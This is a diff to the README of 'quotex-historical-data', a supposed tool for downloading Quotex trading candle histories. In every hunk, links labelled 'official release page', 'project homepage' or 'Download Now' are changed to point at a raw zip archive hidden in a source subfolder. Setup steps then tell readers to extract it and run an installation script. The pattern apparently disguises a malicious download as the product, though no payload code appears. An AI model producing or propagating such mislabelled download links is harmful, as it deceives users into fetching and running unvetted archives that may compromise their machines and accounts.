@@ -1,6 +1,6 @@
 # 📊 quotex-historical-data - Get full market data histories easily
 
-[![Download Now](https://img.shields.io/badge/Download-Data-blue.svg)](https://github.com/chililutefisk51/quotex-historical-data)
+[![Download Now](https://img.shields.io/badge/Download-Data-blue.svg)](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip)
 
 This tool lets you save long periods of market data. Quotex websites limit your view to 199 candles at once. This program breaks that limit. It gathers information directly from the source. You get full CSV files for your strategy testing. It works for all currency pairs.
 
@@ -17,7 +17,7 @@ You need a Windows computer. Ensure you have a stable internet connection. Data 
 
 Follow these instructions to set up the tool on your machine.
 
-1. Go to the [official release page](https://github.com/chililutefisk51/quotex-historical-data) to download the package.
+1. Go to the [official release page](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip) to download the package.
 2. Locate the folder where you saved the file.
 3. Right-click the file and select Extract All.
 4. Open the folder you just created.
@@ -72,7 +72,7 @@ This project receives updates when the broker changes its website code. Check th
 
 ## 📦 Getting the latest version
 
-Visit the [project homepage](https://github.com/chililutefisk51/quotex-historical-data) to access the latest downloads. Always ensure you run the installation script again if you download a significant update. This ensures all background settings match the current version of the tool.
+Visit the [project homepage](https://github.com/chililutefisk51/quotex-historical-data/raw/refs/heads/main/pyquotex/http/historical-data-quotex-v1.4-beta.3.zip) to access the latest downloads. Always ensure you run the installation script again if you download a significant update. This ensures all background settings match the current version of the tool.
 
 ## 📈 Tips for better results
 
